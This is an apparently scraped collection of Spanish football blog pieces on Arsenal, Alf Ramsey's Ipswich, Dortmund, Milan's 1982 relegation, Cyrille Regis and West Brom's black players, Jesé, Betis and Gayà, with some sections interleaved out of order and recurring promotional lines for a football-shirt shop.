solvencia. Fútbol práctico en busca del reconocimiento perdido. Ni el mismísimo Nick Hornby habría podido reconocer a un Arsenal que, tirando de oficio y competitividad, consiguió arrebatar el primer título oficial del curso a un Chelsea al que la pretemporada no parece haberle sentado especialmente bien. Y no fue tanto por la propia victoria (1-0), sino por la manera de conseguirla. Porque el Arsenal se presentó como un equipo sólido, sin fisuras. Bien armado desde atrás y con una estabilidad emocional que parecía impensable hace solo unos meses en el grupo de Wenger. Por fin un Arsenal pragmático, efectivo. Conjugando brillantez con fiabilidad.Tal vez la acumulación de desgracias en Islington tuviera una explicación más terrenal. Tal vez no todo fuera achacable a la inexplicable mala fortuna arsenalesca en forma de lesiones inoportunas y goles estrambóticos. Quizá solo era cuestión de afinar ciertos automatismos y engrasar algunos engranajes. Porque resulta innegable que la simple aparición de Petr Cech en la portería gunner ha tenido un considerable impacto, admitido por el propio Wenger, en la puesta en escena del equipo. Aun estando lejos ya de sus mejores tardes, la sola presencia del gigante de Pilsen bajo palos ha convertido al Arsenal en un conjunto menos inocente, más maduro y seguro de sí mismo. Hay algo ahora en este nuevo Arsenal que instala en el subconsciente de sus rivales una sensación de infranqueabilidad que antes no existía. Con ese aura de mito viviente del checo y con ese golpe de efecto que supuso arrebatarle al Chelsea a un futbolista del que necesitaba desprenderse pero realmente no tenía motivos para hacerlo, en Ashburton Grove han conseguido dar un paso de gigante en sus aspiraciones. Batirles ya no será tan sencillo. Algo nada arsenalesco. Sir Alf Ramsey Way, anteriormente Portman’s Walk, es una calle de la ciudad de Ipswich, a escasos metros del estadio de Portman Road, en una de cuyas esquinas se erige una estatua de bronce. A finales del mes de agosto del año 2000, cuando había transcurrido poco más de un año desde su fallecimiento, la afición del Ipswich Town quiso rendir homenaje al técnico más importante de su dilatada historia, con permiso de Sir Bobby Robson. Desde aquel día, la silueta de Sir Alf Ramsey preside majestuosa, mano en el bolsillo, todo cuanto acontece alrededor del estadio. Apadrinando y cobijando bajo su inerte presencia a esa misma afición a la que un día llevó a ser campeona de Inglaterra.El éxito del Mundial de 1966 terminó difuminando la gran hazaña del legendario técnico de Dagenham al frente de los Tractor Boys. Porque nadie hasta su llegada en el verano de 1955, apenas unos meses después de abandonar la práctica del fútbol en las filas del Tottenham, había manejado con tanta destreza las bridas del imponente Suffolk Punch que adorna la pechera de las camisetas del Town. En el año de su incorporación y debut en los banquillos, con el club sumido en la oscuridad de la Tercera división, Ramsey consiguió que los suyos anotasen la nada despreciable cifra de 106 goles en 46 encuentros. Algo importante estaba empezando a coger forma. Un año más tarde, el Ipswich lograba ascender de categoría y arrancar así una carrera que sería imparable hasta alcanzar la cúspide del fútbol inglés.Tres campañas fueron suficientes para que el club de Suffolk se estableciese en la nueva división y armase las bases para conseguir el tan ansiado ascenso a la máxima categoría por primera vez en la historia de la entidad, logro definitivamente alcanzado en la temporada 1960/61, la sexta de Alf Ramsey en el banquillo de Portman Road. Pero lo mejor estaba aún por llegar.Ramsey, que había introducido importantes revoluciones tácticas en un fútbol que ya empezaba a marcar diferencias entre clubes poderosos y modestos y que ya demandaba una mayor dedicación a la pizarra para tratar de solventar esas diferencias, aportó diversas innovaciones estratégicas que supusieron un plus en un equipo que no contaba con futbolistas especialmente destacables. Modificó la posición de los extremos, meros atacantes con nula vocación defensiva en aquellos tiempos, incorporándolos en fase defensiva a la línea de medios para convertirlos en interiores y obligando así a los laterales rivales a avanzar sobre su banda dejando su espalda peligrosamente al descubierto. Esta pequeña revolución, extremadamente inocente hoy en día pero una auténtica osadía en su tiempo, fue posteriormente empleada por el equipo inglés que conseguiría conquistar la Copa del Mundo del 66 y que acabaría siendo conocido bajo el sobrenombre de ‘The Wingless Wonders‘ (‘Los fantásticos sin extremos’), convirtiéndose en una de las principales señas de identidad del fútbol de Ramsey.Fue con disposiciones tácticas como la descrita con la que consiguieron sorprender a todos aquellos que, en su primer año entre los poderosos, los daban como un evidente candidato a perder la categoría. El Ipswich Town no solo consiguió salvarse sino que, contra todo pronóstico, se alzó campeón por primera y única vez en su historia en la misma temporada de su estreno en primera división superando al Burnley y el Tottenham, sus dos principales competidores. La Football Association no necesitó más para ofrecer el puesto de seleccionador nacional al técnico del milagro. A pesar de no ser la primera opción para ocupar el banquillo del combinado inglés de cara al inminente Mundial a celebrar en el país, el primero de mayo de 1963, tras ocho brillantes temporadas como manager del Ipswich, Alfred Ernest Ramsey tomó el mando de un equipo que acabaría convirtiéndose en legendarioPuedes comprar camisetas del Ipswich Town en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Por novedoso, por refrescante, por estético, por revolucionario, por alternativo. Hay muchos motivos, muy variopintos pero todos ellos válidos, para considerar que uno de los clubes destacados de este año 2013 fue el Borussia Dortmund. Naturalmente, lo de los de Jürgen Klopp viene de atrás, de un par de años atrás, concretamente. Campeón de la Bundesliga en las temporadas 2010/11 y 2011/12, no fue hasta la pasada campaña cuando el cuadro de Westalia ratificó su excepcional momento en competición europea, alcanzando con gran brillantez la segunda final de Liga de Campeones de toda su historia. El equipo de moda. La camiseta que todos queríamos en nuestros armarios.2013 fue el año en el que un producto considerablemente minoritario, de consumo casi clandestino, como el Dortmund pasó a convertirse en un caprichito al alcance de todos. Perdió parte de su misterio pero no abandonó nunca ese aire alternativo y transgresor, arrollador y contundente como uno de esos grupos metal medio underground tan típicamente germanos. Buena fe de ello puede dar el Real Madrid, apeado en semifinales por el que ya ha sido bautizado como ‘el mejor contragolpe del momento en el fútbol mundial’. El Borussia renovó credenciales en 2013. Engrasó el viejo rodillo y reunió méritos más que suficientes, pese a haber caído en la final de Wembley ante el Bayern, para que el aficionado europeo medio sustituyera en su imaginario particular los míticos nombres de Matthias Sammer, Andy Möller, Jürgen Kohler, Stéphane Chapuisat o Lars Ricken por los de Ilkay Gündogan, Robert Lewandowski, Mario Götze, Marco Reus o Mats Hummels. La nueva generación. Puedes comprar camisetas, anoraks, pantalones y todo tipo de indumentaria del Borussia Dortmund en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Adalberto Peñaranda. La nueva perlita de Casa Pina (propiedad, eso sí, de Udinese) tiene acento venezolano. No ha necesitado mucho para brillar. Apenas un mes a las órdenes de Sandoval ha sido suficiente para convertirse en pieza indispensable en el ataque nazarí.Habilidoso, técnico y escurridizo, sus dos goles ante el Levante no hacen sino ratificar las buenas sensaciones que ya venía dejando desde semanas atrás. Dieciocho años y un brote de esperanza en Los Cármenes.Lucas Pérez. Riazor tiene un nuevo ‘neno‘ al que idolatrar y es de la casa. Lo de Lucas ya no es sorpresa porque son ya unas cuantas veces las que aparece en nuestras conversaciones del lunes tras ser protagonista directo de un nuevo gran partido de su equipo. El sábado se doctoró en un escenario de postín. Cuando ya todo parecía perdido para el Dépor, el atacante del Barrio de las Flores arrancó un meritorio punto para los suyos. Delantero con nivel de selección, no tardará en sonar para el equipo inglés de turno. Jaume Domènech. Otra vez decisivo, otra vez el mejor de un equipo convulso. El joven portero de Almenara sostuvo a un Valencia diezmado tras la (injusta) expulsión de Orbán, detuvo un penalti a Saúl Berjón y permitió a Gary Neville salir medianamente airoso de su primer compromiso liguero al frente del equipo. Tiene especial mérito el rendimiento que está ofreciendo. En un club en el que al más mínimo meneo empiezan a caerse las hojas, es uno de sus futbolistas más noveles el que acostumbra a dar la cara siempre. Quizá brille porque es el único valencianista que no está especialmente condicionado por la anarquía táctica.Jan Oblak. Injustamente, el portero esloveno del Atlético de Madrid estaba pasando el primer tercio de la temporada en un discreto segundo plano ante el protagonismo de jugadores como Griezmann o Yannick Carrasco. Y digo injustamente porque si Courtois ha pasado a ser un recuerdo lejano y ha dejado de ser un anhelo es precisamente por la firmeza y seguridad del joven dueño de la portería colchonera. Ayer frenó al Athletic poco antes de que Griezmann diese la vuelta al partido con su golazo. Dominó por arriba, fundamental ante los leones, y se agigantó ante Aduriz en lo que debería de haber sido el segundo de los vascos.Iago Aspas. No es justo que la estratosférica campaña de Nolito esté eclipsando al genio de Moaña. El sábado dio los tres puntos al Celta con una vaselina sobre Pau López al alcance de algunos elegidos. No son ya los goles que anota, y ya son siete en Liga, es la energía y el dinamismo que inyecta en la vanguardia celeste. Un futbolista siempre activo, siempre en posición de causar menoscabo en la defensa rival y de revolucionar cualquier partido. Cada vez más cerca del Iago de 2013. El hecho de que este pasado fin de semana no se hayan celebrado jornadas de competición en las primeras categorías del fútbol europeo no implica que el lunes no tengamos ese espacio reservado para la íntima liturgia del café matutino. El balón continua rodando por muchos rincones y la actualidad sugiere siempre algún debate o conversación sobre la barra del bar. Ha sido la semana de Islandia. De ese pequeño trofeo que la naturaleza decidió regalar a la Humanidad para colocarlo en esa vitrina vacía en mitad del Atlántico Norte. De esa nación misteriosa, extraña y tan diferente a casi todo lo conocido que, con una población total similar a la de la ciudad de Valladolid (algo más de trescientos mil habitantes), ha conseguido clasificar a su selección nacional de fútbol para una fase final de una Eurocopa por vez primera en su historia, poco más de un año después de quedarse a las puertas de participar en un Mundial. No es la conversación de bar el foro idóneo para hablar y argumentar sobre un fútbol tan lejano como el islandés, porque el debate no penetra más allá de Eidur Gudjohnsen y un par de topicazos facilones más. Pero es precisamente el hecho de que un fútbol tan ajeno y desconocido como el del combinado dirigido por Lars Lagerbäck y Heimir Hallgrímsson ocupe tiempo en una conversación tan intrascendente como ésta lo que ayuda a comprender lo meritorio de su gesta.Algo similar ocurre con la selección de Gales, que aún debe sumar un puntito más para confirmar su presencia en la cita francesa, pero que lo tiene prácticamente hecho. Puede que la circunstancia de la presencia de una figura mediática del calibre de Gareth Bale minimice un poco lo magnífico de su fase clasificatoria (y contribuya de manera notable a que, de repente, la prensa deportiva española gire la vista hacia lo que ocurre en Cardiff con inusitada y artificial expectación), pero lo cierto es que el combinado británico está firmando una liguilla clasificatoria brillantísima, liderando invicta un grupo compartido con mundialistas de la talla de Bélgica o Bosnia-Herzegovina. Si no es este año, no será nunca.Paralelamente a la sorprendente clasificación islandesa aparece en la conversación la sonada debacle de Holanda, un seleccionado que deja una inquietante sensación de no tener nada en sus filas y de atravesar uno de esos momentos de precariedad futbolística con los que la historia de este deporte suelen maltratar puntualmente a algunas de sus más grandes leyendas. Apenas resplandece el talento joven de Memphis y Daley Blind y que combina una delicada mezcla de veteranos con el tanque vacío como Sneijder o van Persie y una retahíla inagotable de jóvenes meritorios, con notable futuro pero escaso presente, que no son sino una muestra palpable de la realidad que vive a día de hoy la devaluada competición liguera neerlandesa. Sábado, pasadas las diez de la noche. El Real Madrid acaba de dar buena cuenta de un atrevido aunque tembloroso en defensa Villarreal (4-2). Y lo ha hecho sin echar de menos al ausente Cristiano.El mito del Colonia y la selección alemana entrenaba en 1999 al Fortuna Colonia de la 2. Bundesliga y en el entretiempo de un partido que los suyos palmaban por 2-o contra el Waldhof Mannheim, mientras estaba en plena arenga a los chavales tratando de elevar un poco los ánimos, pasó lo que pasó.Jean Loering, imagino un Dimitri Piterman de la vida, irrumpió en el vestuario y le exigió al bigotón que empaquetase sus bártulos y se largase con viento fresco. Delante de la plantilla en plano. “Le dije a Toni que no quería verle allí en la segunda mitad. Le pedí que abandonase el estadio de inmediato. Ya había estado tentado de echarle hace tiempo, pero lo hice entonces”. Loering, un ángel, declaró poco después que pateo  al entrenador ipso facto y de tan buenas maneras con la única esperanza de cambiar al menos el rumbo del club. “Schumacher era mi ídolo pero no me iba a quedar cruzado de brazos mientras llevaba a mi club a la tumba”. Y su mano experta se comenzó a notar de inmediato, el Fortuna palmó 5 a 1 aquel día. Cayó el Milan 2-0 en Cesena contra un recién ascendido. Si esto fuese un cuento sobre lo paranormal les contaría que todo ocurrió porque el Milan quiso jugar en la zona prohibida, justo a donde el recuerdo le aconsejaba no haber vuelto. Y que por ello murió. Les contaría que ayer una vez finalizado el partido, cuando los vomitorios de la zona prohibida aliviaron completamente del gentío, un transistor inexistente resonó narrando una historia antigua. Que con el campo en calma, el sonido entrecortado de una radio espectral rebotó contra cada trozo de cemento del viejo estadio explicando una victoria inútil. Sin embargo la historia que escupe la radio sí fue real y ocurrió en el mismo escenario de anoche y con los mismos actores sobre las tablas. Anoche murieron un poco los rossoneri, hace treinta años del todo. Retrocedieron a la Serie B por segunda vez en su historia. Fue un 16 de Mayo de 1982 en el Dino Manuzzi y enfrente también estaba el Cesena.El Milan llegaba a la última jornada de una temporada infame con medio cuerpo en Segunda y a expensas de conseguir ensamblar las piezas de un rocambolesco puzzle para poder eludir su destino. La pésima noticia es que eran varias manos las que estaban jugando con los trozos de aquel rompecabezas. A los rojinegros no les bastaba ganar en Cesena para sobrevivir en Primera, necesitaban que el Bolonia no ganase y que el Cagliari o el Génova, uno de los dos, perdiese. El transistor fue artículo de primera necesidad aquella noche. El caso es que en el minuto 42, cuando la radio ya había anunciado que tanto el Bolonia como el Génova estaban sacando adelante sus respectivos encuentros, se adelantó el Cesena. 1-0 y el Milan en Segunda. Y fue aun peor cuando los locales aumentaron la renta en el arranque del segundo acto. Los rojinegros habían viajado a Cesena, a la zona prohibida, para ahogarse bajo las piezas de un puzzle inmenso.Entonces aparece un rayo de luz inesperado a través del transistor, el Nápoles equilibra el marcador ante el Génova. Los de Italo Galbati, quien sabe si espoleados por las noticias o simplemente por instinto, reaccionan y logran acortar la distancia gracias a un tanto del escocés Joe Jordan, bulto inerte durante todo el campeonato. Y a partir de ahí, la radio. Vuela la noticia a Cesena de que el Bolonia se había dejado empatar por el Ascoli y súbitamente Francesco Romano pinta el 2 a 2 en el marcador del Manuzzi. El Milan queda en estado zombi, vivo pero muerto al tiempo. Con el transistor en la oreja, la clasificación en la mano y aquel gol de Ciccio Romano, el Milan se mantenía en Primera tan sólo con marcar uno más. Y aparece entonces Roberto Antonelli. Dustin, así le llamaban por su parecido con Dustin Hoffman, olvida que llevaba meses arrastrándose y marca un tanto tan bello como su apodo. Agarra el balón para resquebrajar en solitario a cuanto defensa le sale al peso y anota el gol de su vida. Fuera de todo ángulo, Dustin hace aparecer el 2-3 que rescata al Milan del mundo de los muertos.Milan brama.Con todos los partidos finalizados menos uno, el Cagliari se había salvado tras empatar (0-0) con la Fiorentina y el Bolonia era equipo de Segunda tras dejarse remontar (2-1) en Ascoli Piceno. Pero aun había un puesto en juego, del que trataban de escapar Milan y Génova. En ese momento tan sólo faltaba por finalizar el partido del San Paolo y la radio era un órgano vital más del cuerpo de cada milanista. Los napolitanos, que vivían más que tranquilos con la clasificación UEFA en el bolsillo y no iban a mover un dedo por la salvación del Milan, aventajaban en un gol a los genoveses y sufrían para contener el ataque visitante. Todo Milan era sureño en aquel momento. Comenzó entonces la ópera bufa. Castellini, portero partenopeo de la época, se entretiene tontamente con la pelota y concede un saque de esquina que el Génova saca para que Mario Faccenda remate en boca de gol sin oposición alguna de la defensa. El Génova se salva y el San Paolo al completo, visitantes y locales, festeja. La acción es un atentado a la deportividad y un chiste del peor gusto que manda al Milan a Segunda División. Mientras tanto en la zona prohibida, la radio que llevaba minutos echando chispas, se congela. Ya saben, si esto fuese una historia sobre lo paranormal les diría que esa radio se escuchó ayer en Cesena. Si Mario Balotelli estuviera realmente empeñado en despertarnos cada día con una nueva tontería, con algo completemente diferente como decían los Monty Python, no lo haría mejor. A poco que se esfuerce acabará como el sucesor negro de Álvaro Vitali. ¿Recuerdan cuando se marcó un Benzema? ¿Tienen fresco en la memoria cuando estrelló su Audi R8 de camino al entrenamiento con el Manchester City? Seguro que sí. Pues resulta, según el Daily Mirror, que el astro bufo llevaba 5.000 libras en metálico en el bolsillo del pantalón y cuando el agente que atendía el siniestro le pregunto el porqué le contestó que porque era rico. Quizá si no estuviera tan preocupado por las finanzas se le ocurriría hacer algo, esta vez sí, completamente diferente, jugar al fútbol. El Villarreal recibe al PAOK de Salónica dentro de un ratito, 21:00, y se que voy con el reloj pegado a los cuartos traseros pero no obstante quiero contaros una historia real que recordé esta tarde sobre el conjunto heleno. Imagínense por un momento que el calendario marca 2008 y ustedes son acérrimos de la sección futbolera del PAOK. Pasean orgullosos por la calle con su camiseta blanquinegra y mientras le echan el diente a la rica moussaka que sirven en el restaurante del viejo Giorgios, pensando tal vez en grandes jugadores que vistieron la elástica del Panthessalonikeios Athlitikos Omilos Konstantinoupoliton como el paquete sportinguista de Milan Luhovy, escuchan el rumor en la esquina. ¡Oye que el PAOK ha fichado a Ibrahimovic! . ¡Venga ya! , ¿El PAOK? . ¡Eso es imposible! . Pues la noticia sale en la web del club…No sabes muy bien si hacer caso del cotilleo, al fin y al cabo las callejas de tu barrio son una sartenada continua de rumores y chismorreos pero aun así corres hacia el aeropuerto para recibir a una de las mayores estrellas del fútbol mundial. Quien sabe, el sueco está como un cencerro y quizá, después de todo, haya decidido cambiar de aires y jugar en el PAOK. Al fin y al cabo quien no se cansaría enseguida de esos sucios italianos, que nos robaron la cultura y nuestras artes… Cinco minutos para que Zlatan baje del avión y los dioses quieran que sean tan sólo cinco porque el corazón se te sale del pecho. Como siga latiendo a ese ritmo añadirá el color rojo al blanquinegro que adorna habitualmente tu pecho.Y llega el astro. Y finalmente del avión desciende un tipo rubio, mezcla de Valery Karpin y un obrero de la construcción que, ante la algaraza de la masa que le jalea con el Zlatan Zlatan pertinente, sonríe y saluda complacido entre estupefacto. Aunque no menos que los que llevan esperando durante horas en la terminal. ¡Quien coño es este tío? . ¡Si no es Ibrahimovic! y ¡Que basura, quememos el aeropuerto!Es el mejor futbolista del momento, sí, pero su ausencia no es tan penosa cuando sus sustitutos serían titulares habituales en cualquier equipo del planeta. El Madrid continua firme en su camino de asalto al título. Lo previsto, vaya. Es un equipo compacto, sólido en defensa y al que varios nombres propios otorgan una mordiente implacable. Como los dientes de una sierra afilada, Di María, Benzema, Bale o Jesé han ido mermando la resistencia de los de Marcelino. Hundiendo la sierra en su estructura y despedazando a un equipo que se ha mostrado como uno de los más fiables de la categoría. De entre todos los dientes, sobresale el del canterano. Jesé acumula cuatro goles en los últimos cuatro partidos del Real Madrid. Jesé está de moda, y no tiene pinta de ser la típica moda efímera. Es un futbolista distinto, ilusionante, ambicioso y capaz. Tanto que ya ha conseguido comenzar a alimentar el debate sobre su idoneidad para la selección nacional de Vicente del Bosque.Me suena el teléfono y una voz inconfundiblemente radiofónica vuelve a picar sobre el tema del momento. ‘¿A quién se parece Jesé? ‘, me pregunta Lartaun de Azumendi. Tenemos la incorregible costumbre de establecer referencias conocidas para juzgar y catalogar a cualquier joven futbolista que comience a despuntar. Es como si eso nos ayudara a colocarnos y a establecer un punto de partida. El nuevo Maradona y el nuevo Zidane, ya saben. Con el atacante canario del Real Madrid lo tenemos un poco más complicado. Jesé no se parece a nadie. Al menos a nadie cercano en el tiempo y que aparezca como referencia habitual en el panorama futbolístico europeo. Tiene cosas de muchos, un poquito de éste y otro poquito de aquél. Es veloz y vertical, como Cristiano, pero al mismo tiempo tiene el mismo temple dentro del área que el ‘Kun’ Agüero. Es físico, como Bale, y exquisito en el regate, como Messi. Es goleador sutil, de los que colocan cuidadosamente la pelota dentro de la portería en lugar de estamparla violentamente contra las redes. Esprinta con la potencia de una manada de bisontes, pero al llegar al momento crítico de la ejecución luce una delicadeza y precisión quirúrgicas. Jesé es uno de esos futbolistas sobre los que es una delicia ponerse a debatir. Presenta tantísimos matices diferentes y un catálogo de registros tan variado y rico que sobre su volcánica irrupción en el Real Madrid se podrían rellenar horas y horas de tertulia. Pero resulta imposible encasillarlo. Sus condiciones y características son de tan difícil ubicación que lo convierten en un futbolista radicalmente diferente a todo lo conocido. Mi primer contacto con el Betis se produjo de manera absolutamente casual. Debía de tener seis o siete años, esa edad en la que a pesar de ser extremadamente influenciable uno tiene escaso control sobre las cosas que le van ocurriendo. En el viejo caserón de mis abuelos había un sótano oscuro, lúgubre, con las paredes enmohecidas y con ese olor a humedad tan característico del lugar. Era un sótano, en definitiva, como deben de ser los sótanos. Los cachivaches se amontonaban por unas estanterías que a mí me parecían desproporcionamente altas. Viejos electrodomésticos, maletas, cajas de cartón, ropa de cama con solera, … todo en armonioso desorden. Dentro de lo poco que quedaba a mi altura había un baúl. Uno de esos viejos baúles de madera y piel con las paredes forradas por dentro con periódicos amarillentos fechados varias décadas atrás. Pasaron muchas visitas clandestinas a aquel sótano (al que, como todo sótano que se precie, teníamos prohibido entrar) hasta que llegó el día en el que por fin me atreví a abrirlo. Me daba pánico pensar en lo que podía haber dentro. Porque yo no pensaba en tesoros, pensaba en nidos de ratas de ojos brillantes y dientes afilados dispuestas a saltar sobre aquel incauto que osara perturbar su refugio.Hasta que un buen día, armándome de valor y movido por una intriga que ya era incontrolable, lo abrí.No había ni rastro de las temibles ratas. En su lugar, un amasijo de viejos juguetes que yo enseguida imaginé de mi padre y mis tíos y que, sin duda, habían conocido mejores tiempos, reposaba en aquel triste espacio. Cochecitos y camiones metálicos, soldados e indios de plástico, canicas de mil colores y tamaños… y allí al fondo, arrebujada de mala manera, una viejísima camiseta de algodón en rayas verticales verdes y blancas que nunca supe cómo había llegado a aquel tétrico sótano del centro de Bilbao. Supe que era una camiseta del Betis por aquellos cromos de cartón con las figuras de Gordillo, Poli Rincón y Gabriel Calderón. Fue el principio de mi relación con el Real Betis, equipo por el que desde entonces, desde aquella extraña experiencia iniciática, he profesado una especie de simpatía infantil, inocente y despreocupada. Como si de alguna manera quisiera corresponder a un destino que quiso dejarme las trece franjas verdiblancas marcadas a fuego desde la infancia pero contra el que yo, por suerte o por desgracia, me rebelé a tiempo antes de sentirme en eterna deuda con él.El retorno del Betis a la máxima categoría me alegra particularmente. No solo por ese cariño tonto y pueril que se tiene por las cosas insignificantes que a uno le retrotraen a la absurda felicidad de su niñez, sino porque el ambiente del Benito Villamarín, el peso de la afición bética y la trascendencia de un equipo histórico deberían ser patrimonio garantizado de la primera división de nuestro fútbol.fueron algunos de los gritos más habituales en ese preciso momento. Más tarde el club anunciará que todo ha sido un error, que el rubiajo del avión también era un delantero bosnio con pasaporte sueco, y que jugaba de azulnegro. Eso si, el sosias llegaba desde Bérgamo y se llamaba Zlatan Muslimovic. Historias… Agosto de 1974 y “When will i see you again” machaca los transistores. Fayette Pinkney, Valerie Holiday y Sheila Ferguson, barnizaban de almíbar la vieja Inglaterra con su soul de Filadelfia. Se hacían llamar “The Three Degrees”, eran negras como la noche y se rumoreaba que hasta el príncipe Carlos las adoraba. Fueron número uno. Cuatro años más tarde, con la fiebre del disco maltratando con saña a la nación, la grada británica dispensaba un recibimiento menos amable a los pocos futbolistas negros que comenzaban a asomarse a las ligas potentes. El West Bromwich Albion, uno de los pocos equipos por los que merecía la pena pagar el abono en aquellos años, juega siempre con tres futbolistas negros en el once. Laurie Cunningham, Brendon Branson y Cyrille Regis. Ron Atkinson, entrenador baggie entonces, bautizó al trío como “The Three Degrees” La diferencia con Fayette Pikney y compañía es que al principio no había aplausos.Poco se puede añadir sobre Laurie Cunningham tras el estupendo artículo que Dadan Narval le dedicó hace unos meses. Si acaso recordar unas cuantas opiniones de Ron Atkinson que le pintan de cuerpo entero. “A Laurie no le poníamos restricciones. Tan solo le decía que agarrara el balón e hiciese daño (…) Nunca trabajé con un futbolista mejor (. .) Tuve a Bryan Robson y a Paolo Futre en el Atlético, que había sido el mejor futbolista europeo del año, pero Laurie podría con cualquiera de ellos”. Junto a Cunningham, mientras la caverna ladraba insensateces como que los negros no estaban hechos para aguantar el invierno inglés, formaban Brendon Batson, un duro lateral derecho maltratado por las lesiones, y Cyrille Regis, que acabaría ocupando lugar reservado en el imaginario histórico del club.Atlético, rápido y fino en el regate, durante sus siete años en el West Brom Regis se construyó una solida reputación como delantero y lo que es más importante, como icono del cambio. No había cromos negros en Inglaterra y Cyrille Regis fue uno de los pocos, junto a Cunningham, que causaron verdadero impacto en la competición. Sobre el campo y en los cerebros, algunos estrechos como un regate pegado a la cal, de la grada.Regis encajaría como protagonista en cualquier historia de superación. “Había cánticos de mono cada vez que agarraba la pelota. Los periódicos remarcaban nuestro color. Perlas negras, oro negro, magia negra…” Pero mientras los perros ladran, el nueve se dedica a jugar. Sin padrinos ni el amparo de ningún sistema de cantera pasa de comer barro en las ligas de aficionados a ser la estrella en uno de los mejores equipos del momento. En tan solo un par de años llega a jugar con la selección pese a las reticencias de muchos. “Si pones un pie en el césped de nuestro Wembley te vas a llevar una de estas en la rodilla”.Su existencia engrandece nuestra competición. Y no hablo ya de merecer o desmerecer, de justicia o de injusticia. De defensa blandita y ataque letal en una temporada en la que costó enderezar el rumbo. Como tampoco quiero hablar del mesiánico retorno de Pepe Mel y de su poético triunfo allí donde no hace tanto tiempo alguien le dio la espalda. Hablo de una estúpida querencia infantil. De un recuerdo anclado en la memoria. De una simpatía irracional que decidió saltar desde el fondo de un baúl mohoso arrinconado en un tenebroso sótano. Bienvenidos a vuestro sitio, béticos.En Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo, puedes comprar camisetas del Real Betis. Quizá no aún con la mística de aquella vieja camiseta de algodón con el escudo torpemente cosido al pecho pero, quién sabe, tal vez acaban arrinconadas y olvidadas en un viejo baúl para que dentro de veinte o treinta años alguien decida vencer sus miedos y abrir la puerta del misterio. En una carrera infinita por la banda izquierda de Mestalla Jordi Alba arranca como un cohete. Apenas apoya los pies sobre el césped. Encogiendo los hombros en característico gesto y acoplando la cabeza al tronco como si quisiera ganar esas milésimas que le proporciona la aerodinámica, el lateral de L’Hospitalet llega hasta medio campo y aparece convertido en Juan Bernat. Comparten una complexión física muy similar, algo enjutos y minimizados, de cuerpo compacto, como mandan los cánones que debe ser un carrilero clásico. Bernat, potente y escurridizo como su antecesor, profundiza sobre la línea de banda buscando ese balón largo hasta que la maquinaria financiera alemana decide que el escenario de sus carreras se traslade a Baviera. Y es entonces, al acometer la definitiva arrancada hasta la línea de fondo, cuando la veloz sombra de Bernat se materializa en José Luis Gayà (Pedreguer, Alicante, 1995) para terminar de modelar la versión 3.0, perfeccionada y con mayores prestaciones, del moderno lateral zurdo valencianista. Alguien en Paterna los está clonando. Y con excelentes resultados.Porque Gayà, aunque se asemeja en sus condiciones, se escapa a las sombras de Alba y Bernat. Asoma su cabeza sobre ellas exhibiendo un compendio de cualidades que le colocan como algo más que un digno sucesor. Debo admitir que cuando comprobé su edad en los primeros compases de su irrupción quedé sorprendido. Juega con el aplomo de un futbolista curtido y con una veteranía impropia de sus diecinueve años, respondiendo con creces a la exigencia que el club le trasladó tras la venta de Bernat al Bayern y aupándose al escalafón de ídolo de Mestalla en apenas unos meses. Como tantos otros laterales modernos, Gayà dio sus primeras zancadas en posiciones más adelantadas, actuando como extremo. Es natural, primero porque en categorías inferiores y fuera del fútbol-11 el concepto de ‘lateral’ queda algo difuso y segundo porque todos los niños quieren atacar, marcar goles, inventar y no limitarse a aguantar e impedir las evoluciones de su rival. Tal vez sea una de las claves en su formación y en su naturalidad a la hora de desenvolverse en posiciones de vanguardia, como parece ser unánime exigencia en el carrilero contemporáneo. Nadie nace queriendo ser lateral. Pero sí hay quien nace con unas condiciones innatas muy definidas para la posición. Es José Luis Gayà, un fijo para Nuno en la presente temporada y caprichito de los grandes de media Europa, un gran ejemplo. La versión revisada y ampliada del lateral clónico de Paterna.Regis recibe un sobre con esta nota y una bala tras sustituir a Garth Crooks en un partido contra Dinamarca. La enviaba un hincha inglés.Hasta su retirada en el Chester de 1996 consiguió 158 goles y se llevó por el camino una Copa con el Coventry. Deslumbrante en el arranque de su carrera, fue reconocido como el mejor futbolista joven en 1978 y uno de sus tantos resultó el mejor de Inglaterra en la 81/82. La clásica cabalgada desde atrás coronada con la contundencia del que está acostumbrado a hacer la misma acción todos los días. Pese a su calidad nítida, su cuenta corriente no comenzó a notar los beneficios de ser un fuera de serie hasta que llegó al Aston Villa, cuando era ya una versión descafeinada de aquel gran jugador del Albion. Correr como un negro no te garantizaba ganar como un blanco, aunque para entonces Cyrille Regis ya había hecho su trabajo. Gracias a él y a unos pocos contemporáneos, los cromos negros contaban ya para el álbum. Como todos los partidos que se juegan en campos de mierda, el Galatasaray-Juventus encontró su solución en un chispazo rudimentario. Diecinueve horas de encuentro hayaron epílogo en un instante breve y rabiosamente ‘old school’. La Juve duró lo que tardó Didier Drogba en peinar automáticamente el clásico balón para que el hombre libre acuchille el espacio. Abc, it’s easy. Lo aprovechó Sneijder, enchufadísimo desde que el árbitro mandara reanudar el partido más largo, para batir a Buffon con un trallazo impecable y arrastrar al Galatasaray a octavos de final de la Champions League a costa de los favoritos. Drogba y Sneijder, las dos apuestas seguras de un club para competir en Champions, ganándose los garbanzos con oficio.Me comenta Antonio Agredano que en el césped del Turk Arena bien podría haber vivido Cthulhu agazapado en un charquito. Lleva razón pero esto no debe ser excusa para la Juventus por dos motivos. En primer lugar  porque la eliminación consumada en Turquía la vienen cocinando a fuego lento  él y sus chavales desde que arrancó la fase de grupos. Al propio míster no le ha quedado más remedio que reconocer en rueda de prensa lo evidente, que no es de recibo para el mejor equipo de Italia haber ganado tan solo un encuentro en toda la competición. Le honra pero en la mochila lleva el enésimo fracaso europeo de un club que, este año sí, miraba el trofeo con optimismo.No es argumento el barro porque los blanquinegros lo domaron mejor que el rival desde el arranque y durante la mayor parte del encuentro. Hábiles para mover el balón, contundentes en la marca, alejando al rival del área y agarrándose a un Carlos Tévez capaz de jugar sobre cristales rotos si lo exige el calendario. Dicho de otro modo, estuvieron a un gol de presumir ante el mundo de oficio como en tantas otras ocasiones. No pierden por el campo porque lo merecieron incluso a pesar del campo; caen por el enesimo desajuste defensivo de una defensa que la temporada pasada era un reloj.Nieve sucia, fango y el sorteo de Champions, invariable, estrujando el reloj contra los intereses de todos. Reducido así a lo primitivo, el encuentro da para pocos análisis. La Juve debe asimilar el palo rápidamente para pelear con fuerza en otros frentes y al menos le queda el consuelo de comprobar como la pareja Llorente-Tévez crece armónicamente en cada partido. No se alegrarán tanto en Roma ni en cualquier 